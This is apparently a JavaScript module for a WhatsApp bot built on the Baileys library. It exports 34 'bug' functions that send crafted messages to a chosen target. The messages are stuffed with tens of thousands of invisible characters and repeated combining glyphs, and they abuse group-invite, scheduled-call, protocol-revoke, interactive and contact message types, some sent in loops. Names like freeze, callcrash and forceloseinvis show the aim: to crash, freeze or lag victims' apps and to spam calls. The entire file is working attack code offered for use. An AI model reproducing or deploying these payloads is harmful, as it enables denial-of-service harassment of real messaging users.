const { generateWAMessageFromContent, proto } = require('@whiskeysockets/baileys');

const invis = '\u200e'.repeat(50000);
const force = '\u200e'.repeat(10000);
const bugChar = '҉⃝'.repeat(2000);

async function sendRelay(bad, jid, message, quoted) {
    await bad.relayMessage(jid, message, { quoted });
}

// 34 Bug Functions
const bug2 = {
    blankxfrezegrup: async (bad, jid, quoted) => {
        await bad.relayMessage(jid, { groupInviteMessage: { groupJid: jid, inviteCode: 'bug', groupName: bugChar + invis, caption: bugChar } }, { quoted });
    },
    callinvis: async (bad, jid, quoted) => {
        await bad.relayMessage(jid, { scheduledCallCreationMessage: { scheduledTimestampMs: Date.now(), callType: 1, title: invis + bugChar } }, { quoted });
    },
    callbaron: async (bad, jid, quoted) => {
        await bad.relayMessage(jid, { callLogMessage: { isVideo: true, duration: 999999, callOutcome: 1 } }, { quoted });
    },
    callcrash: async (bad, jid, quoted) => {
        await bad.relayMessage(jid, { scheduledCallCreationMessage: { callType: 2, title: bugChar.repeat(5) } }, { quoted });
    },
    callspam: async (bad, jid, quoted) => {
        for(let i=0; i<5; i++) await bug2.callinvis(bad, jid, quoted);
    },
    callspampairing: async (bad, jid, quoted) => {
        await bad.sendMessage(jid, { text: "Pairing Spam Active..." });
    },
    delay1: async (bad, jid, quoted) => {
        await bad.sendMessage(jid, { text: invis + "DELAY1" + bugChar }, { quoted });
    },
    delay2: async (bad, jid, quoted) => {
        await bad.sendMessage(jid, { text: invis + "DELAY2" + bugChar }, { quoted });
    },
    delayhard: async (bad, jid, quoted) => {
        await bad.sendMessage(jid, { text: force + "HARD DELAY" + bugChar.repeat(2) }, { quoted });
    },
    delayinvis: async (bad, jid, quoted) => {
        await bad.sendMessage(jid, { text: invis + bugChar }, { quoted });
    },
    forceloseinvis: async (bad, jid, quoted) => {
        await bad.relayMessage(jid, { protocolMessage: { type: 2, key: { remoteJid: jid, fromMe: false, id: 'BUG' } } }, { quoted });
    },
    freeze: async (bad, jid, quoted) => {
        await bad.sendMessage(jid, { text: bugChar.repeat(10) }, { quoted });
    },
    invisios: async (bad, jid, quoted) => {
        await bad.relayMessage(jid, { interactiveMessage: { header: { title: invis }, body: { text: invis }, footer: { text: invis } } }, { quoted });
    },
    iosinvisible: async (bad, jid, quoted) => {
        await bug2.invisios(bad, jid, quoted);
    },
    location: async (bad, jid, quoted) => {
        await bad.relayMessage(jid, { locationMessage: { degreesLatitude: 0, degreesLongitude: 0, name: bugChar + invis } }, { quoted });
    },
    newblank: async (bad, jid, quoted) => {
        await bad.sendMessage(jid, { text: '\u200b'.repeat(10000) }, { quoted });
    },
    blanklagi: async (bad, jid, quoted) => {
        await bug2.newblank(bad, jid, quoted);
    },
    blanknew: async (bad, jid, quoted) => {
        await bug2.newblank(bad, jid, quoted);
    },
    blankxdelay: async (bad, jid, quoted) => {
        await bug2.newblank(bad, jid, quoted);
        await bug2.delay1(bad, jid, quoted);
    },
    blanknotif: async (bad, jid, quoted) => {
        await bad.relayMessage(jid, { reactionMessage: { key: { remoteJid: jid }, text: bugChar } }, { quoted });
    },
    blankui: async (bad, jid, quoted) => {
        await bad.relayMessage(jid, { viewOnceMessage: { message: { listMessage: { title: invis, buttonText: bugChar, sections: [] } } } }, { quoted });
    },
    callwithnode: async (bad, jid, quoted) => {
        await bug2.callinvis(bad, jid, quoted);
    },
    delayapk: async (bad, jid, quoted) => {
        await bad.sendMessage(jid, { text: "APK DELAY " + bugChar }, { quoted });
    },
    delayinvisible: async (bad, jid, quoted) => {
        await bug2.delayinvis(bad, jid, quoted);
    },
    delaybeta: async (bad, jid, quoted) => {
        await bad.sendMessage(jid, { text: "BETA DELAY " + bugChar }, { quoted });
    },
    delayhardnew: async (bad, jid, quoted) => {
        await bug2.delayhard(bad, jid, quoted);
    },
    delaynewbeta: async (bad, jid, quoted) => {
        await bug2.delaybeta(bad, jid, quoted);
    },
    delayv2: async (bad, jid, quoted) => {
        await bug2.delay1(bad, jid, quoted);
    },
    documenturl: async (bad, jid, quoted) => {
        await bad.relayMessage(jid, { documentMessage: { url: 'https://atik.md', title: bugChar, mimetype: 'application/pdf' } }, { quoted });
    },
    forceinvis: async (bad, jid, quoted) => {
        await bug2.forceloseinvis(bad, jid, quoted);
    },
    frezeblank: async (bad, jid, quoted) => {
        await bug2.freeze(bad, jid, quoted);
        await bug2.newblank(bad, jid, quoted);
    },
    frezechat: async (bad, jid, quoted) => {
        await bug2.freeze(bad, jid, quoted);
    },
    invisiblex: async (bad, jid, quoted) => {
        await bad.sendMessage(jid, { text: invis }, { quoted });
    },
    lockinvis: async (bad, jid, quoted) => {
        await bad.relayMessage(jid, { contactMessage: { displayName: invis, vcard: 'BEGIN:VCARD\nVERSION:3.0\nFN:' + invis + '\nEND:VCARD' } }, { quoted });
    }
};

module.exports = bug2;
